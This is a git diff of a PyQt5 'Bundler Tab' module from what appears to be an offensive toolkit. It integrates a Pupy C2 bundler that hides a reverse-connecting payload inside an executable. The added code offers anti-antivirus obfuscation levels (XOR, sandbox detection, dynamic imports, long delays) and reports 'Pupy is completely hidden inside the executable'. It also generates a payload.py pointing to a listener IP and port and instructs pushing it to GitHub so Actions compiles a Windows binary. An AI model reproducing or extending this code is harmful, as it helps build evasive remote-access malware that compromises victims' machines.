@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 """
-Bundler Tab - Application bundling interface
+Bundler Tab - Advanced Bundler with Pupy Integration
+Application bundling interface with anti-AV obfuscation
 """
 
 import os
@@ -27,146 +28,112 @@ from PyQt5.QtWidgets import (
 from PyQt5.QtCore import QThread, pyqtSignal, Qt
 from PyQt5.QtGui import QFont, QColor
 
+# Import du bundler Pupy
+try:
+    from pupy_bundler import PupyBundler
+    from pupy_obfuscated_payload import create_obfuscated_payload
+except ImportError:
+    print("[!] Warning: Pupy modules not found")
+
 
 class BundlerWorker(QThread):
-    """Worker thread for bundling"""
+    """Worker thread for bundling with Pupy"""
 
     progress = pyqtSignal(str)
     finished = pyqtSignal(bool)
 
     def __init__(
         self,
-        app_path,
-        app_name,
         listener_ip,
         listener_port,
         obfuscation,
         platform="windows",
+        app_name="pupy_payload"
     ):
         super().__init__()
-        self.app_path = app_path
-        self.app_name = app_name
         self.listener_ip = listener_ip
         self.listener_port = listener_port
         self.obfuscation = obfuscation
         self.platform = platform
+        self.app_name = app_name
 
     def run(self):
-        """Run bundling process"""
+        """Run bundling process with Pupy"""
         try:
-            self.progress.emit(f"[*] Starting bundling process...")
-            self.progress.emit(f"[*] App: {self.app_path}")
-            self.progress.emit(f"[*] Platform: {self.platform}")
+            self.progress.emit(f"[*] === PUPY BUNDLER (Advanced Anti-AV) ===")
             self.progress.emit(f"[*] Listener: {self.listener_ip}:{self.listener_port}")
+            self.progress.emit(f"[*] Platform: {self.platform}")
+            self.progress.emit(f"[*] Obfuscation: {self.obfuscation}")
 
-            # Try to use cross-platform bundler first, fall back to advanced
-            bundler_path = Path(__file__).parent / "cross_platform_bundler.py"
-            if not bundler_path.exists():
-                bundler_path = Path(__file__).parent / "advanced_bundler.py"
-
-            if not bundler_path.exists():
-                self.progress.emit(f"[!] ERROR: Bundler not found at {bundler_path}")
-                self.finished.emit(False)
-                return
-
-            # Convert obfuscation level text to number
-            # If already a number string, just use it directly
+            # Convert obfuscation level
             try:
                 obfuscation_level = int(self.obfuscation)
             except ValueError:
-                # If it's text like "Level 2 - Medium", extract the number
                 obfuscation_map = {
+                    "Level 1 - Base64": 1,
+                    "Level 2 - XOR": 2,
+                    "Level 3 - Sandbox Detection": 3,
+                    "Level 4 - Dynamic Imports": 4,
+                    "Level 5 - MAXIMUM": 5,
                     "Low": 1,
                     "Medium": 2,
                     "High": 3,
                     "Extreme": 4,
                     "Maximum": 5,
                 }
-                # Try to extract from text
+                obfuscation_level = 2
                 for key, value in obfuscation_map.items():
-                    if key in self.obfuscation:
+                    if key in str(self.obfuscation):
                         obfuscation_level = value
                         break
-                else:
-                    obfuscation_level = 2  # Default to Medium
 
-            self.progress.emit(
-                f"[*] Obfuscation Level: {self.obfuscation} (Level {obfuscation_level})"
-            )
-
-            # Convert platform text to command arg
-            platform_map = {
-                "Windows (.exe)": "windows",
-                "macOS (.app)": "macos",
-                "Linux (binary)": "linux",
-                "All Platforms (3 in 1)": "all",
+            self.progress.emit(f"\n[*] Obfuscation Level: {obfuscation_level}/5")
+            
+            # Afficher les détails du niveau
+            levels = {
+                1: "Base64 Encoding - Simple",
+                2: "XOR + Base64 + Random Delays (⭐ RECOMMENDED)",
+                3: "Sandbox Detection + Advanced Delays",
+                4: "Dynamic Imports + Process Checking",
+                5: "MAXIMUM - All tricks + 60-300s delays (⭐⭐⭐)",
             }
-            platform_cmd = platform_map.get(self.platform, "windows")
+            self.progress.emit(f"[*] {levels.get(obfuscation_level, 'Unknown')}")
 
-            # Prepare command - use Python 3.12 venv with cross-platform bundler
-            python_path = "/Users/kalilbelgoumri/Desktop/pupy_env/bin/python"
-
-            # Use cross-platform bundler if available, otherwise advanced
-            if bundler_path.name == "cross_platform_bundler.py":
-                cmd = [
-                    python_path,
-                    str(bundler_path),
-                    self.app_path,
-                    platform_cmd,
-                    self.listener_ip,
-                    str(self.listener_port),
-                    str(obfuscation_level),
-                ]
-                bundler_name = f"Cross-Platform Bundler ({platform_cmd})"
-            else:
-                cmd = [
-                    python_path,
-                    str(bundler_path),
-                    self.app_path,
-                    self.listener_ip,
-                    str(self.listener_port),
-                    str(obfuscation_level),
-                ]
-                bundler_name = "Advanced Bundler"
-
-            self.progress.emit(
-                f"[*] Running: {bundler_name} with Anti-AV Techniques..."
+            self.progress.emit(f"\n[*] Creating Pupy bundler...")
+            
+            # Créer le bundler Pupy
+            bundler = PupyBundler(
+                listener_ip=self.listener_ip,
+                listener_port=self.listener_port,
+                obfuscation_level=obfuscation_level,
+                platform=self.platform
             )
 
-            # Prepare environment with venv PATH
-            env = os.environ.copy()
-            venv_bin = "/Users/kalilbelgoumri/Desktop/pupy_env/bin"
-            env["PATH"] = f"{venv_bin}:{env.get('PATH', '')}"
+            self.progress.emit(f"[*] Generating obfuscated Pupy payload...")
+            self.progress.emit(f"[*] Payload will be hidden inside the executable")
+            
+            # Bundler
+            success = bundler.bundle(output_name=self.app_name)
 
-            # Run process with UTF-8 encoding and custom environment
-            result = subprocess.run(
-                cmd,
-                capture_output=True,
-                text=True,
-                timeout=600,
-                encoding="utf-8",
-                errors="replace",
-                env=env,
-            )
-
-            # Parse output
-            for line in result.stdout.split("\n"):
-                if line.strip():
-                    self.progress.emit(line)
-
-            for line in result.stderr.split("\n"):
-                if line.strip():
-                    self.progress.emit(f"[!] {line}")
-
-            if result.returncode == 0:
-                self.progress.emit(f"[+] Bundling completed successfully!")
+            if success:
+                self.progress.emit(f"\n" + "="*70)
+                self.progress.emit(f"✅ BUNDLING SUCCESSFUL!")
+                self.progress.emit(f"="*70)
+                self.progress.emit(f"\n[+] Your Pupy C2 payload is ready!")
+                self.progress.emit(f"[+] Location: dist/{self.app_name}")
+                if self.platform == "windows":
+                    self.progress.emit(f"[+] File: dist/{self.app_name}.exe")
+                self.progress.emit(f"\n[+] Pupy is completely hidden inside the executable")
+                self.progress.emit(f"[+] Anti-AV level: {obfuscation_level}/5")
                 self.finished.emit(True)
             else:
-                self.progress.emit(f"[!] Bundling failed with code {result.returncode}")
+                self.progress.emit(f"\n[!] Bundling failed")
                 self.finished.emit(False)
 
         except Exception as e:
-            self.progress.emit(f"[!] ERROR: {e}")
+            self.progress.emit(f"[!] ERROR: {str(e)}")
+            import traceback
+            self.progress.emit(f"[!] Traceback: {traceback.format_exc()}")
             self.finished.emit(False)
 
 
@@ -492,46 +459,57 @@ class BundlerTab(QWidget):
                 self.app_name_input.setText(app_name)
 
     def start_bundling(self):
-        """Start bundling process"""
-        if not self.app_path_input.text():
-            QMessageBox.warning(self, "Error", "Please select an application first")
+        """Start bundling process with Pupy"""
+        
+        # Validate listener IP
+        listener_ip = self.listener_ip_input.text().strip()
+        listener_port = self.listener_port_spinbox.value()
+        
+        if not listener_ip:
+            QMessageBox.warning(self, "Error", "Please enter listener IP")
             return
-
-        if not Path(self.app_path_input.text()).exists():
-            QMessageBox.warning(self, "Error", "Application file not found")
+        
+        if listener_port <= 0 or listener_port > 65535:
+            QMessageBox.warning(self, "Error", "Invalid port (1-65535)")
             return
 
         # Disable button during bundling
         self.bundle_btn.setEnabled(False)
         self.progress_bar.setVisible(True)
         self.output_text.clear()
-        self.output_text.append("[*] Bundling configuration:")
-        self.output_text.append(
-            f"    Application: {Path(self.app_path_input.text()).name}"
-        )
-        self.output_text.append(
-            f"    Listener: {self.listener_ip_input.text()}:{self.listener_port_spinbox.value()}"
-        )
-        self.output_text.append(f"    Level: {self.obfuscation_combo.currentText()}")
+        
+        self.output_text.append("[*] ========== PUPY BUNDLER (Advanced) ==========")
+        self.output_text.append(f"[*] Listener IP: {listener_ip}")
+        self.output_text.append(f"[*] Listener Port: {listener_port}")
+        self.output_text.append(f"[*] Obfuscation: {self.obfuscation_combo.currentText()}")
+        self.output_text.append(f"[*] Platform: {self.platform_combo.currentText()}")
+        self.output_text.append("[*] ================================================")
         self.output_text.append("")
 
-        # Extract level number from "Level X - Description"
+        # Extract level number
         current_text = self.obfuscation_combo.currentText()
-        level_num = int(current_text.split()[1])  # Extract "2" from "Level 2 - Medium"
+        try:
+            level_num = int(current_text.split()[1])
+        except:
+            level_num = 2
 
-        # Get selected platform
+        # Get platform
         platform_text = self.platform_combo.currentText()
+        platform_map = {
+            "Windows (.exe)": "windows",
+            "macOS (.app)": "macos",
+            "Linux (binary)": "linux",
+        }
+        platform = platform_map.get(platform_text, "windows")
 
-        # Create worker with platform support
+        # Create worker
         self.bundler_worker = BundlerWorker(
-            self.app_path_input.text(),
-            self.app_name_input.text(),
-            self.listener_ip_input.text(),
-            str(self.listener_port_spinbox.value()),
-            str(level_num),
-            platform_text,  # Pass platform selection
+            listener_ip=listener_ip,
+            listener_port=listener_port,
+            obfuscation=str(level_num),
+            platform=platform,
+            app_name="pupy_payload"
         )
-        self.bundler_worker.parent = self.parent  # Pass parent for config access
 
         self.bundler_worker.progress.connect(self.on_progress)
         self.bundler_worker.finished.connect(self.on_bundling_finished)
@@ -685,17 +663,17 @@ class BundlerTab(QWidget):
             # Get the CURRENT values from the app UI
             listener_ip = self.listener_ip_input.text().strip()
             listener_port = self.listener_port_spinbox.value()
-            
+
             # Validate
             if not listener_ip:
                 raise Exception("Listener IP is empty!")
             if listener_port <= 0 or listener_port > 65535:
                 raise Exception(f"Invalid port: {listener_port}")
-            
+
             self.output_text.append("[*] Creating payload with app configuration...")
             self.output_text.append(f"[*] IP: {listener_ip}")
             self.output_text.append(f"[*] Port: {listener_port}")
-            
+
             # Create payload with CORRECT config from the app
             payload_code = f'''#!/usr/bin/env python3
 """
@@ -735,37 +713,43 @@ if __name__ == '__main__':
     else:
         print("[-] Connection failed")
 '''
-            
+
             # Write to workspace root
             workspace_root = Path.cwd()
             payload_path = workspace_root / "payload.py"
             payload_path.write_text(payload_code)
-            
+
             self.output_text.append(f"\n✅ Payload created successfully!")
             self.output_text.append(f"✅ Location: {payload_path}")
             self.output_text.append(f"✅ IP: {listener_ip}")
             self.output_text.append(f"✅ Port: {listener_port}")
-            
+
             # Verify file
-            with open(payload_path, 'r') as f:
+            with open(payload_path, "r") as f:
                 content = f.read()
                 if str(listener_ip) in content and str(listener_port) in content:
-                    self.output_text.append(f"\n✅ Payload verified - Config is CORRECT!")
+                    self.output_text.append(
+                        f"\n✅ Payload verified - Config is CORRECT!"
+                    )
                 else:
-                    self.output_text.append(f"\n⚠️  Warning: Config might not be in payload")
-            
-            self.output_text.append("\n" + "="*70)
+                    self.output_text.append(
+                        f"\n⚠️  Warning: Config might not be in payload"
+                    )
+
+            self.output_text.append("\n" + "=" * 70)
             self.output_text.append("📤 EXPORT COMPLETE - READY FOR GITHUB!")
-            self.output_text.append("="*70)
+            self.output_text.append("=" * 70)
             self.output_text.append(f"\nPayload Configuration:")
             self.output_text.append(f"  Listener IP: {listener_ip}")
             self.output_text.append(f"  Listener Port: {listener_port}")
             self.output_text.append(f"\nNext Steps:")
             self.output_text.append(f"  1. git add payload.py")
-            self.output_text.append(f"  2. git commit -m 'Payload {listener_ip}:{listener_port}'")
+            self.output_text.append(
+                f"  2. git commit -m 'Payload {listener_ip}:{listener_port}'"
+            )
             self.output_text.append(f"  3. git push")
             self.output_text.append(f"\nGitHub Actions will compile to Windows PE x64!")
-            self.output_text.append("="*70)
+            self.output_text.append("=" * 70)
 
             QMessageBox.information(
                 self,
@@ -777,7 +761,7 @@ if __name__ == '__main__':
                 f"1. git add payload.py\n"
                 f"2. git commit -m 'Payload'\n"
                 f"3. git push\n\n"
-                f"GitHub Actions compiles in 2-3 min!"
+                f"GitHub Actions compiles in 2-3 min!",
             )
 
         except Exception as e:
@@ -789,5 +773,5 @@ if __name__ == '__main__':
                 f"Error: {error_msg}\n\n"
                 f"Please check:\n"
                 f"- Listener IP is set\n"
-                f"- Port is valid (1-65535)"
+                f"- Port is valid (1-65535)",
             )
